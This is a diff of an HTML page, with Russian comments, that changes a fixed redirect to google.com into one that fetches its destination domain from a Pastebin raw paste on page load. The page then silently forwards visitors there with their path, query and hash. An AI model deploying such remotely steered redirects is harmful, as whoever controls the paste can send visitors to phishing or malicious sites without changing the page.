@@ -4,30 +4,43 @@
   <meta charset="UTF-8" />
   <title>Redirecting...</title>
   <script>
-    window.onload = function() {
-      const base = "https://google.com"; // куда редиректим
+    window.onload = async function() {
+      try {
+        // 1️⃣ Получаем домен (одно слово) из Pastebin
+        const response = await fetch("https://pastebin.com/raw/Mbned2Ye");
+        const domainText = (await response.text()).trim();
 
-      // Получаем путь после имени пользователя
-      // Например, /random1/random2/1
-      let path = window.location.pathname;
+        // 2️⃣ Формируем базовый адрес
+        const base = `https://${domainText}.com`;
 
-      // Разбиваем путь на части, убираем пустые
-      const parts = path.split("/").filter(Boolean);
+        // 3️⃣ Получаем путь после имени пользователя
+        let path = window.location.pathname;
 
-      // Если есть хотя бы два сегмента, пропускаем первые два (random1 и random2)
-      if (parts.length >= 2) {
-        parts.splice(0, 2);
+        // 4️⃣ Разбиваем путь на части, убираем пустые
+        const parts = path.split("/").filter(Boolean);
+
+        // 5️⃣ Если есть хотя бы два сегмента, пропускаем первые два (random1 и random2)
+        if (parts.length >= 2) {
+          parts.splice(0, 2);
+        }
+
+        // 6️⃣ Собираем оставшуюся часть пути
+        const rest = parts.join("/");
+
+        // 7️⃣ Учитываем query-параметры и hash
+        const query = window.location.search || "";
+        const hash = window.location.hash || "";
+
+        // 8️⃣ Формируем итоговую ссылку
+        const target = rest ? `${base}/${rest}${query}${hash}` : `${base}${query}${hash}`;
+
+        // 9️⃣ Перенаправляем
+        window.location.replace(target);
+      } catch (e) {
+        console.error("Ошибка при загрузке домена:", e);
+        document.body.innerHTML = "<p>Не удалось получить адрес редиректа.</p>";
       }
-
-      // Собираем оставшуюся часть
-      const rest = parts.join("/");
-
-      // Добавляем к базовому адресу
-      const target = rest ? `${base}/${rest}` : base;
-
-      // Перенаправляем
-      window.location.replace(target);
-    }
+    };
   </script>
 </head>
 <body>
